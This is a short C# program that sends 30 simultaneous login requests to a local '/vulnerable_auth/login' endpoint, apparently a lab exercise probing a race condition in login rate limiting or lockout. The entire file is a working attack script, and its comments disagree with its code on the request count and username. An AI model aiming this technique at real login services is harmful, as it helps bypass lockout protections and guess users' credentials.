using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

class Program
{
    private static readonly HttpClient Client = new(
        new SocketsHttpHandler { MaxConnectionsPerServer = int.MaxValue })
    { BaseAddress = new Uri("http://localhost:5166") };   // ← adjust port if needed

    static async Task Main()
    {
        const int N = 30;                     // fire 20 parallel logins
        Task[] jobs = new Task[N];
        for (int i = 0; i < N; i++) jobs[i] = Fire(i);
        await Task.WhenAll(jobs);
    }

    static async Task Fire(int id)
    {
        // form-encoded body: username=carlos&password=111112
        var form = new Dictionary<string, string>
        {
            ["username"] = "supergirl",
            ["password"] = "111112"
        };
        using var content = new FormUrlEncodedContent(form);

        var sw = Stopwatch.StartNew();
        var resp = await Client.PostAsync("/vulnerable_auth/login", content);
        string body = await resp.Content.ReadAsStringAsync();
        sw.Stop();

        Console.WriteLine($"[{id}] {(int)resp.StatusCode} {resp.ReasonPhrase} " +
                          $"in {sw.ElapsedMilliseconds} ms – {body}");
    }
}
